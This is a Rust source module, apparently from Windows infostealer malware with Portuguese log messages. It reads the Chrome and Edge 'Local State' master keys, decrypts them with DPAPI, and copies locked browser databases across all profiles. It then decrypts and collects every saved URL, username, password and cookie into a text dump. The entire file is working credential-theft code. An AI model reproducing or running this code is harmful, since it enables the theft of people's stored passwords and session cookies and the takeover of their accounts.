use std::fs;
use std::fs::OpenOptions;
use std::io::Read;
use std::os::windows::fs::OpenOptionsExt;
use dirs::data_local_dir;
use rusqlite::Connection;
use winapi::um::dpapi::CryptUnprotectData;
use winapi::um::wincrypt::DATA_BLOB;
use base64::engine::general_purpose::STANDARD;
use base64::Engine;
use crate::crypto::decrypt_data;

pub fn get_cookies_as_text(_username: &str) -> String {
    println!("[BROWSER] Iniciando coleta de dados...");
    let mut all_data = String::new();
    
    let chrome_key = get_browser_key("Chrome");
    let edge_key = get_browser_key("Edge");
    
    println!("[BROWSER] Chrome key len: {}, Edge key len: {}", chrome_key.len(), edge_key.len());
    
    if !edge_key.is_empty() {
        all_data.push_str(&collect_browser_data("Edge", &edge_key));
    }
    if !chrome_key.is_empty() {
        all_data.push_str(&collect_browser_data("Chrome", &chrome_key));
    }
    
    if all_data.is_empty() {
        println!("[!] Nenhum dado extraído.");
    } else {
        println!("[+] Extração concluída: {} bytes", all_data.len());
    }
    
    all_data
}

pub fn get_cookies_with_key(_username: &str, master_key: &[u8]) -> Result<String, String> {
    println!("[BROWSER] Decrypting with provided master key...");
    
    if master_key.len() != 32 {
        return Err("Invalid master key length".to_string());
    }
    
    let mut all_data = String::new();
    all_data.push_str(&collect_browser_data("Chrome", master_key));
    all_data.push_str(&collect_browser_data("Edge", master_key));
    
    if all_data.is_empty() {
        Err("No data decrypted".to_string())
    } else {
        Ok(all_data)
    }
}

fn get_browser_key(browser: &str) -> Vec<u8> {
    println!("[BROWSER] ========== Getting key for: {} ==========", browser);
    
    let local_state_path = match browser {
        "Chrome" => match data_local_dir() {
            Some(path) => {
                let p = path.join("Google").join("Chrome").join("User Data").join("Local State");
                println!("[BROWSER] Chrome path: {:?}", p);
                p
            }
            None => {
                println!("[BROWSER] Failed to get local data dir for Chrome");
                return Vec::new();
            }
        },
        "Edge" => match data_local_dir() {
            Some(path) => {
                let p = path.join("Microsoft").join("Edge").join("User Data").join("Local State");
                println!("[BROWSER] Edge path: {:?}", p);
                p
            }
            None => {
                println!("[BROWSER] Failed to get local data dir for Edge");
                return Vec::new();
            }
        },
        _ => return Vec::new(),
    };
    
    if !local_state_path.exists() {
        println!("[BROWSER] File does NOT exist: {:?}", local_state_path);
        return Vec::new();
    }
    println!("[BROWSER] File exists!");
    
    if let Ok(data) = fs::read_to_string(&local_state_path) {
        println!("[BROWSER] File read successfully, {} bytes", data.len());
        
        if let Ok(json) = serde_json::from_str::<serde_json::Value>(&data) {
            if let Some(encrypted_key) = json["os_crypt"]["encrypted_key"].as_str() {
                println!("[BROWSER] encrypted_key found, len: {}", encrypted_key.len());
                
                if let Ok(key_bytes) = STANDARD.decode(encrypted_key) {
                    println!("[BROWSER] Base64 decoded, {} bytes", key_bytes.len());
                    
                    if key_bytes.len() > 5 {
                        println!("[BROWSER] Removing DPAPI prefix (5 bytes)");
                        
                        let decrypted_key = decrypt_with_dpapi(&key_bytes[5..]);
                        println!("[BROWSER] decrypt_with_dpapi returned {} bytes", decrypted_key.len());
                        
                        if decrypted_key.len() == 32 {
                            println!("[BROWSER] ✅✅✅ SUCCESS! Got valid 32-byte master key ✅✅✅");
                            return decrypted_key;
                        } else {
                            println!("[BROWSER] ❌ decrypted_key has {} bytes (expected 32)", decrypted_key.len());
                        }
                    }
                }
            }
        }
    }
    
    println!("[BROWSER] ❌ Returning empty key for {}", browser);
    Vec::new()
}

fn copy_locked_file(src: &std::path::PathBuf, dst: &std::path::PathBuf) -> bool {
    for attempt in 1..=3 {
        if fs::copy(src, dst).is_ok() {
            return true;
        }
        
        if let Ok(mut src_file) = OpenOptions::new()
            .read(true)
            .share_mode(0x00000001 | 0x00000002 | 0x00000004)
            .open(src) 
        {
            if let Ok(mut dst_file) = fs::File::create(dst) {
                let mut buffer = Vec::new();
                if src_file.read_to_end(&mut buffer).is_ok() {
                    if std::io::Write::write_all(&mut dst_file, &buffer).is_ok() {
                        return true;
                    }
                }
            }
        }
        
        if attempt < 3 {
            std::thread::sleep(std::time::Duration::from_millis(500));
        }
    }
    false
}

fn collect_browser_data(browser: &str, key: &[u8]) -> String {
    println!("[BROWSER] Collecting data for: {}", browser);
    let mut result = String::new();
    let mut password_count = 0;
    let mut cookie_count = 0;
    
    if key.len() != 32 {
        println!("[BROWSER] ❌ Invalid key length: {} (expected 32). Skipping {}", key.len(), browser);
        return result;
    }
    
    let user_data_path = match browser {
        "Chrome" => data_local_dir().map(|p| p.join("Google/Chrome/User Data")),
        "Edge" => data_local_dir().map(|p| p.join("Microsoft/Edge/User Data")),
        _ => return result,
    };

    let user_data_path = match user_data_path {
        Some(path) if path.exists() => path,
        _ => return result,
    };
    
    let mut profiles = vec!["Default".to_string()];
    if let Ok(entries) = fs::read_dir(&user_data_path) {
        for entry in entries.flatten() {
            let name = entry.file_name().to_string_lossy().to_string();
            if name.starts_with("Profile ") {
                profiles.push(name);
            }
        }
    }
    
    println!("[BROWSER] Profiles found: {:?}", profiles);
    
    for profile in profiles {
        let profile_path = user_data_path.join(&profile);
        
        // Senhas
        let login_db = profile_path.join("Login Data");
        if login_db.exists() {
            println!("[BROWSER] Found Login Data for profile: {}", profile);
            let tmp = std::env::temp_dir().join(format!("lg_{}_{}.db", browser, profile));
            if copy_locked_file(&login_db, &tmp) {
                if let Ok(conn) = Connection::open(&tmp) {
                    if let Ok(mut stmt) = conn.prepare("SELECT origin_url, username_value, password_value FROM logins") {
                        let rows = stmt.query_map([], |row| {
                            let u: String = row.get(0).unwrap_or_default();
                            let user: String = row.get(1).unwrap_or_default();
                            let p: Vec<u8> = row.get(2).unwrap_or_default();
                            
                            let prefix = if p.len() >= 3 { &p[0..3] } else { b"???" };
                            println!("[BROWSER] Password prefix: {:?}", prefix);
                            
                            let dec = decrypt_data(&p, key);
                            if !dec.is_empty() {
                                password_count += 1;
                                Ok(Some(format!("URL: {} | User: {} | Pass: {}\n", u, user, dec)))
                            } else {
                                Ok(None)
                            }
                        });
                        if let Ok(r) = rows {
                            result.push_str(&format!("\n[{}: {} - PASSWORDS]\n", browser, profile));
                            for line in r.flatten().flatten() {
                                result.push_str(&line);
                            }
                        }
                    }
                }
                let _ = fs::remove_file(tmp);
            }
        }
        
        // Cookies
        let ck_path = profile_path.join("Network/Cookies");
        let ck_db = if ck_path.exists() { ck_path } else { profile_path.join("Cookies") };
        if ck_db.exists() {
            println!("[BROWSER] Found Cookies for profile: {}", profile);
            let tmp = std::env::temp_dir().join(format!("ck_{}_{}.db", browser, profile));
            if copy_locked_file(&ck_db, &tmp) {
                if let Ok(conn) = Connection::open(&tmp) {
                    if let Ok(mut stmt) = conn.prepare("SELECT host_key, name, encrypted_value FROM cookies") {
                        let rows = stmt.query_map([], |row| {
                            let h: String = row.get(0).unwrap_or_default();
                            let n: String = row.get(1).unwrap_or_default();
                            let v: Vec<u8> = row.get(2).unwrap_or_default();
                            
                            let prefix = if v.len() >= 3 { &v[0..3] } else { b"???" };
                            println!("[BROWSER] Cookie prefix: {:?}", prefix);
                            
                            if v.starts_with(b"v20") {
                                println!("[BROWSER] ⚠️ v20 detected! Chrome 127+ uses new encryption");
                            }
                            
                            let dec = decrypt_data(&v, key);
                            if !dec.is_empty() {
                                cookie_count += 1;
                                let safe_dec = dec.replace('\n', " ").replace('\r', " ");
                                Ok(Some(format!("{} | {} | {}\n", h, n, safe_dec)))
                            } else {
                                Ok(None)
                            }
                        });
                        if let Ok(r) = rows {
                            result.push_str(&format!("\n[{}: {} - COOKIES]\n", browser, profile));
                            for line in r.flatten().flatten() {
                                result.push_str(&line);
                            }
                        }
                    }
                }
                let _ = fs::remove_file(tmp);
            }
        }
    }
    
    println!("[BROWSER] {} - Passwords: {}, Cookies: {}", browser, password_count, cookie_count);
    result
}

fn decrypt_with_dpapi(encrypted: &[u8]) -> Vec<u8> {
    println!("[DPAPI] Trying to decrypt {} bytes", encrypted.len());
    
    unsafe {
        let mut in_blob = DATA_BLOB { 
            cbData: encrypted.len() as u32, 
            pbData: encrypted.as_ptr() as *mut u8 
        };
        let mut out_blob = DATA_BLOB { 
            cbData: 0, 
            pbData: std::ptr::null_mut() 
        };
        
        let result = CryptUnprotectData(&mut in_blob, std::ptr::null_mut(), std::ptr::null_mut(), 
                              std::ptr::null_mut(), std::ptr::null_mut(), 0, &mut out_blob);
        
        if result != 0 {
            println!("[DPAPI] CryptUnprotectData SUCCESS!");
            if !out_blob.pbData.is_null() {
                let decrypted = std::slice::from_raw_parts(out_blob.pbData, out_blob.cbData as usize);
                let res = decrypted.to_vec();
                winapi::um::winbase::LocalFree(out_blob.pbData as _);
                println!("[DPAPI] Decrypted {} bytes", res.len());
                return res;
            }
        } else {
            println!("[DPAPI] CryptUnprotectData FAILED!");
        }
    }
    Vec::new()
}